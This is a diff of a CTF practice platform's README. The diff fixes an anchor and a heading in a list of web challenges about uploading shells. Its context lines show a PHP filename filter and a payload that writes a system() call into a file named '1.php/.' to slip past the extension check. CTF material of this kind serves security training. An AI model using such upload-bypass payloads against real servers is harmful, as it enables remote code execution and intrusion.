@@ -6,7 +6,7 @@ TCTF v2 is the CTF practice platform for MasonCC, and I have put up some web cha
 *  [Shorter shell](#shorter-shell)  
 *  [Peasy shell not PHP](#peasy-shell-not-php)  
 *  [Apache2 giv u new Shell](#apache2-giv-u-new-shell)  
-*  [Destroy chllenge with ur shell?](#destroy-chllenge-with-ur-shell?)  
+*  [Destroy chllenge with ur shell?](#destroy-chllenge-with-ur-shell)  
 
 ## Cover Peasy
 Level: :star:  
@@ -104,7 +104,7 @@ if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
 ```
 Payload: ```url/?content=<?php system('ls');?>&filename=1.php/.```  
 
-## Destroy chllenge with ur shell?
+## Destroy chllenge with ur shell
 Level: :star::star::star:  
 ```php
 // up.php
